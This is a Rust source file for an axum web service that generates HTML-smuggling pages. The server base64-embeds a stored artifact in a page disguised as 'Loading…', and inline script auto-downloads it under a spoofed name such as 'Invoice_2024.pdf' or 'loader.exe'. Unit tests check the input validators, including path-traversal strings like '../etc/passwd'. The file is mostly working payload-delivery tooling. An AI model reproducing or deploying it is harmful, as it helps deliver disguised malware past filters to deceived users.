use axum::{
    body::Body,
    extract::{Json, Path, State},
    http::{header::CONTENT_TYPE, StatusCode},
    response::Response,
};
use base64::{engine::general_purpose::STANDARD, Engine};
use rand::Rng;
use serde::{Deserialize, Serialize};
use crate::state::AppState;

// ── HTML template ─────────────────────────────────────────────────────────────

const HTML_TEMPLATE: &str = r#"<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title>
<style>*{margin:0;padding:0}body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f9fafb;font-family:system-ui,sans-serif;color:#6b7280}p{font-size:.875rem}</style>
</head><body><p>Loading…</p>
<script>(function(){var d="{{PAYLOAD_B64}}",n={{FAKE_NAME}},b=atob(d),a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);var u=URL.createObjectURL(new Blob([a]));var e=document.createElement("a");e.href=u;e.download=n;document.body.appendChild(e);e.click();setTimeout(function(){URL.revokeObjectURL(u);document.body.removeChild(e);},1000);})();</script>
</body></html>"#;

// ── Helper validators ─────────────────────────────────────────────────────────

fn validate_download_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= 64
        && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

fn sanitize_fake_name(name: &str) -> String {
    // Strip NUL bytes
    let no_nul: String = name.chars().filter(|&c| c != '\0').collect();
    // Take the last path component (split on both `/` and `\`)
    let last = no_nul
        .split(|c| c == '/' || c == '\\')
        .filter(|s| !s.is_empty())
        .last()
        .unwrap_or("")
        .to_string();
    // Strip HTML special chars and truncate to 128 chars
    last.chars()
        .filter(|&c| !matches!(c, '<' | '>' | '&'))
        .take(128)
        .collect()
}

fn validate_link_id(id: &str) -> bool {
    id.len() == 32 && id.chars().all(|c| matches!(c, '0'..='9' | 'a'..='f'))
}

// ── Request / response structs ────────────────────────────────────────────────

#[derive(Deserialize)]
pub struct SmugRequest {
    pub download_id: String,
    pub fake_name:   String,
}

#[derive(Serialize)]
pub struct SmugResponse {
    pub link_id: String,
    pub url:     String,
}

// ── POST /api/v1/smug ─────────────────────────────────────────────────────────

pub async fn create_smug(
    State(state): State<AppState>,
    Json(body): Json<SmugRequest>,
) -> Result<Json<SmugResponse>, StatusCode> {
    if !validate_download_id(&body.download_id) {
        return Err(StatusCode::BAD_REQUEST);
    }

    let fake_name = sanitize_fake_name(&body.fake_name);
    if fake_name.is_empty() {
        return Err(StatusCode::BAD_REQUEST);
    }

    let artifacts_dir = std::path::PathBuf::from(&state.config.artifacts_dir);
    let path_file = artifacts_dir.join(format!("{}.path", body.download_id));

    let artifact_path_str = match std::fs::read_to_string(&path_file) {
        Ok(s)  => s.trim().to_owned(),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Err(StatusCode::NOT_FOUND),
        Err(_) => return Err(StatusCode::INTERNAL_SERVER_ERROR),
    };

    // Canonicalize artifact path and verify it stays within artifacts_dir
    let artifact_path = std::path::PathBuf::from(&artifact_path_str);
    let canon_artifacts = match artifacts_dir.canonicalize() {
        Ok(p) => p,
        Err(_) => return Err(StatusCode::INTERNAL_SERVER_ERROR),
    };
    let canon_artifact = match artifact_path.canonicalize() {
        Ok(p) => p,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Err(StatusCode::NOT_FOUND),
        Err(_) => return Err(StatusCode::INTERNAL_SERVER_ERROR),
    };
    if !canon_artifact.starts_with(&canon_artifacts) {
        return Err(StatusCode::BAD_REQUEST);
    }

    let bytes = match std::fs::read(&canon_artifact) {
        Ok(b)  => b,
        Err(_) => return Err(StatusCode::NOT_FOUND),
    };

    let b64 = STANDARD.encode(&bytes);

    // Generate a 32-char lowercase hex link_id from 16 random bytes
    let raw: [u8; 16] = rand::thread_rng().gen();
    let link_id: String = raw.iter().map(|b| format!("{:02x}", b)).collect();

    let fake_name_json = serde_json::to_string(&fake_name).unwrap();
    let html = HTML_TEMPLATE
        .replace("{{PAYLOAD_B64}}", &b64)
        .replace("{{FAKE_NAME}}", &fake_name_json);

    let out_path = state.smuggler_dir.join(format!("{}.html", link_id));
    std::fs::write(&out_path, html.as_bytes())
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Json(SmugResponse {
        url: format!("/d/{}/{}", link_id, percent_encode_path(&fake_name)),
        link_id,
    }))
}

// ── GET /d/:link_id/:fake_name ────────────────────────────────────────────────

pub async fn serve_smug(
    State(state): State<AppState>,
    Path((link_id, _)): Path<(String, String)>,
) -> Result<Response, StatusCode> {
    // Invalid link_id → 404 (don't leak format expectations)
    if !validate_link_id(&link_id) {
        return Err(StatusCode::NOT_FOUND);
    }

    let html_path = state.smuggler_dir.join(format!("{}.html", link_id));
    let html = match std::fs::read_to_string(&html_path) {
        Ok(s)  => s,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Err(StatusCode::NOT_FOUND),
        Err(_) => return Err(StatusCode::INTERNAL_SERVER_ERROR),
    };

    Ok(Response::builder()
        .header(CONTENT_TYPE, "text/html; charset=utf-8")
        .header("Cache-Control", "no-store, no-cache")
        .body(Body::from(html))
        .unwrap())
}

// ── URL path segment encoder ──────────────────────────────────────────────────

fn percent_encode_path(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '~') {
            out.push(c);
        } else if c.is_ascii() {
            let _ = std::fmt::Write::write_fmt(&mut out, format_args!("%{:02X}", c as u8));
        } else {
            let mut buf = [0u8; 4];
            let encoded = c.encode_utf8(&mut buf);
            for b in encoded.bytes() {
                let _ = std::fmt::Write::write_fmt(&mut out, format_args!("%{:02X}", b));
            }
        }
    }
    out
}

// ── Unit tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // validate_download_id

    #[test]
    fn download_id_accepts_valid() {
        assert!(validate_download_id("abc123"));
        assert!(validate_download_id("valid-id_123"));
        assert!(validate_download_id("a"));
        assert!(validate_download_id(&"a".repeat(64)));
    }

    #[test]
    fn download_id_rejects_empty() {
        assert!(!validate_download_id(""));
    }

    #[test]
    fn download_id_rejects_too_long() {
        assert!(!validate_download_id(&"a".repeat(65)));
    }

    #[test]
    fn download_id_rejects_path_traversal() {
        assert!(!validate_download_id("../etc/passwd"));
        assert!(!validate_download_id("abc/def"));
        assert!(!validate_download_id("abc\\def"));
    }

    #[test]
    fn download_id_rejects_invalid_chars() {
        assert!(!validate_download_id("abc!@#"));
        assert!(!validate_download_id("abc .txt"));
        assert!(!validate_download_id("abc\0def"));
    }

    // sanitize_fake_name

    #[test]
    fn fake_name_strips_path_separators() {
        assert_eq!(sanitize_fake_name("../../etc/passwd"), "passwd");
        assert_eq!(sanitize_fake_name("folder/sub/file.pdf"), "file.pdf");
        assert_eq!(sanitize_fake_name("folder\\file.pdf"), "file.pdf");
    }

    #[test]
    fn fake_name_strips_nul_bytes() {
        assert_eq!(sanitize_fake_name("file\0.pdf"), "file.pdf");
        assert_eq!(sanitize_fake_name("file\0"), "file");
    }

    #[test]
    fn fake_name_truncates_at_128() {
        assert_eq!(sanitize_fake_name(&"a".repeat(200)).len(), 128);
    }

    #[test]
    fn fake_name_preserves_clean_name() {
        assert_eq!(sanitize_fake_name("Invoice_2024.pdf"), "Invoice_2024.pdf");
        assert_eq!(sanitize_fake_name("loader.exe"), "loader.exe");
    }

    #[test]
    fn fake_name_strips_html_special_chars() {
        assert_eq!(sanitize_fake_name("file<script>.pdf"), "filescript.pdf");
        assert_eq!(sanitize_fake_name("</script>alert.pdf"), "scriptalert.pdf");
        assert_eq!(sanitize_fake_name("a&b.pdf"), "ab.pdf");
    }

    // validate_link_id

    #[test]
    fn link_id_accepts_32_lowercase_hex() {
        assert!(validate_link_id("a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"));
        assert!(validate_link_id(&"0".repeat(32)));
        assert!(validate_link_id(&"f".repeat(32)));
    }

    #[test]
    fn link_id_rejects_uppercase() {
        assert!(!validate_link_id("A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4"));
    }

    #[test]
    fn link_id_rejects_wrong_length() {
        assert!(!validate_link_id("a1b2c3d4"));
        assert!(!validate_link_id(&"a".repeat(34)));
        assert!(!validate_link_id(""));
    }

    #[test]
    fn link_id_rejects_non_hex() {
        assert!(!validate_link_id("a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3dg"));
        assert!(!validate_link_id("a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d "));
    }

    // serde_json escaping and percent-encoding

    #[test]
    fn fake_name_with_quotes_is_json_escaped() {
        // Verify that fake_name containing a double quote doesn't produce raw JS
        let fake_name = "file\".exe";
        let json = serde_json::to_string(fake_name).unwrap();
        // JSON output must include escaped quote, not raw "
        assert!(json.contains("\\\""), "quote must be escaped in JSON");
        assert!(!json.contains("\","), "raw quote must not appear adjacent to comma");
    }

    #[test]
    fn percent_encode_path_encodes_spaces_and_special_chars() {
        assert_eq!(percent_encode_path("Invoice 2024.pdf"), "Invoice%202024.pdf");
        assert_eq!(percent_encode_path("file#1.pdf"), "file%231.pdf");
        assert_eq!(percent_encode_path("safe-name_v1.pdf"), "safe-name_v1.pdf");
        assert_eq!(percent_encode_path("a?b"), "a%3Fb");
    }
}
